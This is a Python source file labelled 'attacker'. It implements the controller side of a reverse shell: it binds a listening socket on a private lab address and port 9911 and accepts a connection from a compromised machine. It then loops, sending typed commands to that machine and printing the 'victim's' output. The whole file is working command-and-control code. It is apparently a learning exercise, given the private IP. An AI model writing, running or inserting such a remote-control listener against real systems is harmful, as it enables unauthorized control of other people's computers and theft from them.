# attacker
import socket
import sys


# Create a Socket ( connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = "192.168.56.1"  # Server_IP address
        port = 9911
        s = socket.socket()
        print('Socket created successfully..\n')

    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        # print('\nhost IP: ', host)
        # print('\nport # : ', port)

        print("\nBinding the Port: " + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
        bind_socket()


# Establish connection with a client (socket must be listening)

def socket_accept():
    conn, address = s.accept()
    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
    send_commands(conn)
    conn.close()


# Send commands to other pc
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()     # to close the connection
            s.close()   # Close the socket
            sys.exit()  # exit cmd
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))  # Send the commands
            client_response = str(conn.recv(1024), "utf-8")     # receive victims response
            print(client_response, end="")  # To move to another line


def main():
    create_socket()     # Step 1 : Create the socket
    bind_socket()       # Step 2 : Bind socket with host and port
    socket_accept()     # Step 3 : Accept the socket request from the other pc and call send_command


main()
